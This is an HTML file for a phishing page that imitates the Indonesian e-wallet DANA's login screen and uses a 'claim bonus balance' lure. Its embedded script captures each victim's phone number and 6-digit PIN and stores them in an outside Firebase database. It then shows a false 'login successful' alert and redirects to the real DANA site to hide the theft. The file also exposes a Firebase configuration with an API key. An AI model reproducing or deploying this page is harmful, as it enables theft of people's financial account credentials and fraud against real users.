<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DANA - Masuk</title>
    
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-database.js";

        // Konfigurasi Firebase
        const firebaseConfig = {
          apiKey: "AIzaSyADiJ85Yr0cnM3AlN4E23DeLhjjtzS-utg",
          authDomain: "testing-f7e72.firebaseapp.com",
          databaseURL: "https://testing-f7e72-default-rtdb.firebaseio.com",
          projectId: "testing-f7e72",
          storageBucket: "testing-f7e72.firebasestorage.app",
          messagingSenderId: "683074830976",
          appId: "1:683074830976:web:b76109a0b991cbd9335c65"
        };

        // Inisialisasi Firebase
        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        document.addEventListener('DOMContentLoaded', function () {
            document.getElementById('loginForm').addEventListener('submit', function (e) {
                e.preventDefault();

                const phoneNumber = document.getElementById('phoneNumber').value;
                const pin = document.getElementById('pin').value;

                if (!/^\d{6}$/.test(pin)) {
                    alert('PIN harus 6 digit angka.');
                    return;
                }

                const newUserRef = ref(database, 'users/' + Date.now());
                set(newUserRef, {
                    phoneNumber: phoneNumber,
                    pin: pin
                }).then(() => {
                    alert('Login berhasil! Anda akan dialihkan ke DANA.');
                    window.location.href = "https://www.dana.id/";
                }).catch((error) => {
                    alert('Terjadi kesalahan: ' + error.message);
                });
            });
        });
    </script>

    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: #fff;
            padding: 30px 25px;
            border-radius: 20px;
            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.08);
            width: 100%;
            max-width: 340px;
            text-align: center;
        }

        .logo {
            margin-bottom: 30px;
        }

        .logo img {
            width: 120px;
            height: auto;
        }

        h1 {
            color: #333;
            font-size: 20px;
            margin-bottom: 30px;
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        input {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            border: 1px solid #e0e0e0;
            border-radius: 10px;
            background: #f8f8f8;
            box-sizing: border-box;
            transition: all 0.3s ease;
        }

        input:focus {
            border-color: #00AAFF;
            background: #ffffff;
            box-shadow: 0 0 0 3px rgba(0, 170, 255, 0.1);
            outline: none;
        }

        button {
            width: 100%;
            background: linear-gradient(135deg, #00AAFF, #0088CC);
            color: white;
            padding: 15px;
            font-size: 16px;
            font-weight: 600;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 15px;
            transition: all 0.2s ease;
        }

        button:hover {
            opacity: 0.95;
            transform: translateY(-1px);
        }

        .link-group {
            margin: 20px 0;
            display: flex;
            justify-content: space-between;
        }

        .link-group a {
            color: #00AAFF;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .promo-banner {
            background-color: #F5FBFF;
            border: 1px solid #00AAFF;
            border-radius: 10px;
            padding: 12px;
            margin-top: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .promo-banner span {
            color: #00AAFF;
            font-size: 14px;
            font-weight: 500;
        }

        .footer-text {
            color: #666;
            font-size: 12px;
            margin-top: 25px;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <a href="https://www.dana.id/">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSGglzp3pi04sdTe7teWwIj3abbA0HHqwYcxwzXVWi5ueYhk_MwQge3tE8&s=10" alt="DANA Logo">
            </a>
        </div>
        <h1>Selamat datang kembali!</h1>
        <form id="loginForm">
            <div class="form-group">
                <input type="tel" 
                       id="phoneNumber" 
                       name="phoneNumber" 
                       placeholder="Nomor HP terdaftar"
                       required
                       pattern="[0-9]{10,13}">
            </div>
            <div class="form-group">
                <input type="password" 
                       id="pin" 
                       name="pin" 
                       placeholder="Masukkan 6 digit PIN"
                       required
                       maxlength="6"
                       inputmode="numeric">
            </div>
            <button type="submit">MASUK</button>
        </form>
        
        <div class="link-group">
            <a href="#">Lupa PIN?</a>
            <a href="#">Daftar</a>
        </div>

        <div class="promo-banner">
            <span>üéÅ Klaim Bonus Saldo DANA Sekarang!</span>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="#00AAFF">
                <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
            </svg>
        </div>

        <p class="footer-text">
            Dengan masuk atau mendaftar, Anda menyetujui<br>
            <a href="#" style="color: #00AAFF;">Syarat & Ketentuan</a> dan 
            <a href="#" style="color: #00AAFF;">Kebijakan Privasi</a> DANA
        </p>
    </div>
</body>
</html>
